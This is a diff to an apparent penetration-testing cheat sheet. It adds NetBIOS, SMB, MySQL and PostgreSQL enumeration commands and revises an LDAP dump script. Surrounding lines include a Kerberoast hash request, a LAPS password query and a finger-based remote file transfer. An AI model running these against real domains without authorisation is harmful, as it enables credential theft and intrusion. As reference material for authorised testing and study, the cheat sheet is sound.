@@ -684,6 +684,10 @@
 <td><code>GetUserSPNs.py -request -dc-ip 192.168.2.160 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt; -outputfile hashes.kerberoast </code></td>
 <td>Kerberoast users</td>
 </tr>
+<tr>
+<td><code>nbtscan &lt;IP_addr&gt;</code></td>
+<td>NBT scan / enumerate NetBios (ports 137, 138, 139)</td>
+</tr>
 </tbody>
 </table>
 <h2 id="linux-exploits">Linux exploits<a href="#linux-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
@@ -761,6 +765,10 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <tr>
 <td><code>showrev -P</code></td>
 <td>Patch information</td>
+</tr>
+<tr>
+<td><code>/etc/ftpd/tfpusers</code></td>
+<td>Not a command i know, but file location for FTP access control on solaris</td>
 </tr>
 </tbody>
 </table>
@@ -1004,8 +1012,20 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 <td>permissions of a file/ directory</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>net share</code></td>
+<td>List all SMB shares</td>
+</tr>
+<tr>
+<td><code>net use X: \\Server\Share</code></td>
+<td>Map network share to drive X (then cd X:\ ) - can use any unused letter</td>
+</tr>
+<tr>
+<td><code>nbtstat -n</code></td>
+<td>Retrieve NetBios names of local device</td>
+</tr>
+<tr>
+<td><code>nbtstat -A &lt;IP_addr&gt;</code></td>
+<td>Retrieve NetBios name of remote host (01 and 1D indicate the master browser, 03 is the user)</td>
 </tr>
 </tbody>
 </table>
@@ -1015,7 +1035,10 @@ finger x@$RHOST | base64 -d &gt; <span style="color:#e6db74">&#34;</span>$LFILE<
 server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;10.10.11.152&#39;</span>, port <span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>)
 connection <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, <span style="color:#e6db74">&#34;&lt;username&gt;&#34;</span>, <span style="color:#e6db74">&#34;&lt;password&gt;&#34;</span>) <span style="color:#75715e">#leave blank for null authentication</span>
 connection<span style="color:#f92672">.</span>bind()
-x <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=timelapse,DC=htb&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;ms-MCS-AdmPwd&#39;</span>,<span style="color:#e6db74">&#39;SAMAccountname&#39;</span>])
+x <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=example,DC=com&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectClass=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;*&#39;</span>) <span style="color:#75715e"># domain here is example.com</span>
+
+<span style="color:#75715e"># ---- Old filter ----</span>
+<span style="color:#75715e"># search_filter=&#39;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&#39;, search_scope=&#39;SUBTREE&#39;, attributes=[&#39;ms-MCS-AdmPwd&#39;,&#39;SAMAccountname&#39;])</span>
 
 print(connection<span style="color:#f92672">.</span>entries)
 
@@ -1465,8 +1488,8 @@ print(server<span style="color:#f92672">.</span>info)
 <td>select info from a table</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
+<td><code>mysql.user</code></td>
+<td>password hashes location</td>
 </tr>
 </tbody>
 </table>
@@ -1490,6 +1513,10 @@ print(server<span style="color:#f92672">.</span>info)
 <tr>
 <td><code>psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt;</code></td>
 <td>Remote connection</td>
+</tr>
+<tr>
+<td><code>SELECT version();</code></td>
+<td>Get version info</td>
 </tr>
 <tr>
 <td><code>\list</code></td>
